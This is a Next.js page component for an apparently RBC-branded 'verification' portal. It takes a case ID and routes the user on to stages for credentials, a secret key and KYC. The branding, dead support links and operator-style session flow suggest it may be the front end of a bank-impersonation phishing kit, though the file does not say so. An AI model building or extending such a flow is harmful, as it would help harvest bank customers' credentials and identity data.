'use client';

/**
 * Landing/Home Page
 *
 * Entry point for customer-initiated verification path
 * Customer enters case ID and is redirected to session UUID
 */

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { useSessionStore } from '@shared';
import { SplitLayout } from '@/components/layout/SplitLayout';
import { RBCInput, RBCButton, RBCFooter, ServiceNotices } from '@/components/ui/RBCComponents';
import { RBCWaitingState, VERIFICATION_STEPS } from '@/components/ui/RBCWaitingState';
import { AlertCircle } from 'lucide-react';

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  /**
   * Handle case ID submission
   */
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        // Lookup existing session by case ID
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials'; // Backend returns current stage

        if (!sessionUuid) {
          setFieldError('Unable to validate case ID. Please try again.');
          return;
        }

        // Map stage name to route (secret_key -> secret-key)
        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        // Store session UUID and case ID in session store
        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          stage: currentStage as any,
        });

        // Redirect to current stage (session resumption)
        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <SplitLayout>
      <div className="w-full flex flex-col flex-1">
        {isLoading ? (
          <RBCWaitingState
            message="Validating your case ID..."
            steps={VERIFICATION_STEPS.caseId}
          />
        ) : (
          <form onSubmit={handleSubmit} className="w-full mb-5 shrink-0" noValidate>
            <RBCInput
              id="caseId"
              name="caseId"
              type="text"
              label="Case ID"
              placeholder=""
              value={caseId}
              onChange={(e) => {
                setCaseId(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isLoading}
              autoComplete="off"
              required
              showLockIcon={true}
            />

            {/* Error message */}
            {fieldError && (
              <div className="flex items-center gap-2 text-sm text-[#ef4444] mb-4">
                <AlertCircle className="h-4 w-4" />
                <span>{fieldError}</span>
              </div>
            )}

            <RBCButton type="submit" disabled={!caseId.trim() || isLoading}>
              {isLoading ? 'Processing...' : 'Next'}
            </RBCButton>

            <div className="flex flex-col gap-3 mt-5 pt-5 border-t border-[#eeeeee]">
              <a href="#" className="text-[#006ac3] no-underline text-[0.95rem] font-normal transition-colors hover:text-[#005a9f] hover:underline">
                Recover Your Case ID
              </a>
              <a href="#" className="text-[#006ac3] no-underline text-[0.95rem] font-normal transition-colors hover:text-[#005a9f] hover:underline">
                Contact Support
              </a>
            </div>
          </form>
        )}

        <ServiceNotices />
        <RBCFooter />
      </div>
    </SplitLayout>
  );
}
